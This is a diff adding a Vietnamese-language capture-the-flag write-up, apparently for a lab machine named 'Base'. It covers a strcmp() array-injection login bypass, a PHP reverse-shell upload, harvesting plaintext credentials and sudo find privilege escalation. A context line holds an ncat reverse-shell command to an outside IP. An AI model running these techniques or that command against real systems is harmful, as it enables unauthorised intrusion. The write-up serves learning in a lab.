@@ -605,3 +605,154 @@ echo C:\Log-Management\ncat.exe -e cmd.exe 10.10.16.76 4444 > job.bat
 ![1774161750904](image/Report/1774161750904.png)
 ![1774161761911](image/Report/1774161761911.png)
 ![1774161774729](image/Report/1774161774729.png)
+
+---
+
+## 6. Base
+
+### Task 1: Which two TCP ports are open on the remote host?
+
+- Dùng nmap để scan:
+![1774167144752](image/Report/1774167144752.png)
+
+> 22, 80
+
+### Task 2: What is the relative path on the webserver for the login page?
+
+- Bấm vào button `login` và kiểm tra URL:
+![1774167223188](image/Report/1774167223188.png)
+
+> /login/login.php
+
+### Task 3: How many files are present in the '/login' directory?
+
+- Dùng chức năng `inspect` của browser và reload lại trang `login`, nhìn vào phần `source`:
+![1774167363985](image/Report/1774167363985.png)
+![1774167379154](image/Report/1774167379154.png)
+
+- Thấy được 1 file `login.php` tuy nhiên nó là đáp án sai
+- Thử query `http://10.129.10.23/login/` thì đã có kết quả:
+![1774167527024](image/Report/1774167527024.png)
+
+>3
+
+### Task 4: What is the file extension of a swap file?
+
+- Link tham khảo: <https://www.computerhope.com/jargon/s/swapfile.htm>
+- web có đề cập các đuôi của swap file:
+![1774167783744](image/Report/1774167783744.png)
+- Từ task 3 thì ta thấy được file khả nghi là `login.php.swp`:
+![1774167844733](image/Report/1774167844733.png)
+
+> .swp
+
+### Task 5: Which PHP function is being used in the backend code to compare the user submitted username and password to the valid username and password?
+
+- Đề có gợi ý:
+![1774168482159](image/Report/1774168482159.png)
+- Lần lượt kiểm tra các file và đến file `login.php.swp` thì tìm ra đáp án:
+![1774168565828](image/Report/1774168565828.png)
+
+> strcmp()
+
+### Task 6: In which directory are the uploaded files stored?
+
+- Dùng gobuster để dò các thư mục với word list `common`:
+![1774169352287](image/Report/1774169352287.png)
+
+> Chưa có kết quả
+
+- Tuy nhiên ở Task 3 ta đã phát hiện web dùng `apache` nên ta dùng wordlist `Apache.txt` để dò thử:
+![1774171019248](image/Report/1774171019248.png)
+
+> Cũng không có kết quả
+
+- Quay lại thfi lấy đáp án có dạng `/_...` nên ta tạo file mới gắn dấu `_` vào trước các kí tự của wordlist `common.txt` và quét lại:
+![1774171687882](image/Report/1774171687882.png)
+
+> Đã tìm được: /_uploaded
+
+### Task 7: Which user exists on the remote host with a home directory?
+
+- Để hoàn thành được task này thì ta cần đăng nhập với quyền user hoặc root
+- Ở task 5 ta đã biết server `strcmp()` để so khớp username và password, ta có thể dùng burp suite để chặn gói tin đăng nhập và sửa payload:
+![1774172740695](image/Report/1774172740695.png)
+- Giải thích:
+  - Khi gửi username[], PHP sẽ coi đó là một mảng thay vì một chuỗi. Khi so sánh một mảng với một chuỗi bằng strcmp(), hàm này sẽ trả về giá trị NULL
+  - Server dùng `==` để kiểm tra kết quả của `strcmp()` có bằng `0` hay không
+  - Trong PHP, giá trị `NULL == 0` trả về kết quả là `TRUE`
+- Vào được trang upload thì sử dụng mẫu file `php` để reverse shell thường dùng để tải lên server
+- Mở port 1234 để lắng nghe
+- Sau khi upload file `rev.php` lên server thì GET để chạy file:
+![1774173493533](image/Report/1774173493533.png)
+![1774173505670](image/Report/1774173505670.png)
+
+> Đã reverse thành công
+
+- Shell ban đầu đang bị chút vấn đề gì đó, ta cần ổn định shell:
+
+```powershell
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+export TERM=xterm
+```
+
+- Sau khi đi khám phá một chút thì phát hiện account ẩn trong `config.php` mà ở các task trước ta chưa xem được:
+![1774173765331](image/Report/1774173765331.png)
+  - username = "admin";
+  - password = "thisisagoodpassword"
+  
+- Tuy nhiên đến đây vẫn chưa tìm được đáp án cho task này, ta ra ngoài thư mục `/home` để kiểm tra:
+![1774174306070](image/Report/1774174306070.png)
+
+> Đáp án task này là "John"
+
+- Đã tìm thấy `user flag` ở thư mục `home/john/` nhưng thử mở thì không có quyền:
+![1774175699371](image/Report/1774175699371.png)
+
+### Task 8: What is the password for the user present on the system?
+
+- Đáp án vô tình tìm được ở task 7
+
+> thisisagoodpassword
+
+### Task 9: What is the full path to the command that the user john can run as user root on the remote host?
+
+- Thử đăng nhập ssh (Ở task 1 ta đã biết server có mở cổng cho ssh) bằng tài khoản admin vô tình tình được ở task 7 nhưng phát hiện mật khẩu đó là sai:
+![1774174973165](image/Report/1774174973165.png)
+- Và cũng đã thăm dò hết các thư mục có thể tìm nhưng không tìm ra password nào khác
+- Suy ra có thể mật khẩu đó là của tài khoản `John`:
+![1774175122174](image/Report/1774175122174.png)
+
+> Password đó đúng là của John
+
+- Từ shell của John ta có thể tìm được đáp án:
+![1774175207294](image/Report/1774175207294.png)
+
+> /usr/bin/find
+
+### Task 10: What action can the find command use to execute commands?
+
+- Link tham khảo: <https://unix.stackexchange.com/questions/389705/understanding-the-exec-option-of-find>
+
+> exec
+
+### User flag?
+
+- Ta đã tìm được vị trí của flag là `home/john/` ở task 7:
+![1774175759619](image/Report/1774175759619.png)
+
+> f54846c258f3b4612f78a819573d158e
+
+### Root flag
+
+- Ta đã phát hiện lệnh `find` chạy được với quyền root, vậy nên ta chỉ cần dùng lệnh find để gọi shell thì shell đó cũng chạy ở quyền root:
+![1774176011729](image/Report/1774176011729.png)
+
+> 51709519ea18ab37dd6fc58096bea949
+
+### Tổng kết kết quả
+
+![1774176044254](image/Report/1774176044254.png)
+![1774176053208](image/Report/1774176053208.png)
+![1774176072245](image/Report/1774176072245.png)
+![1774176082012](image/Report/1774176082012.png)
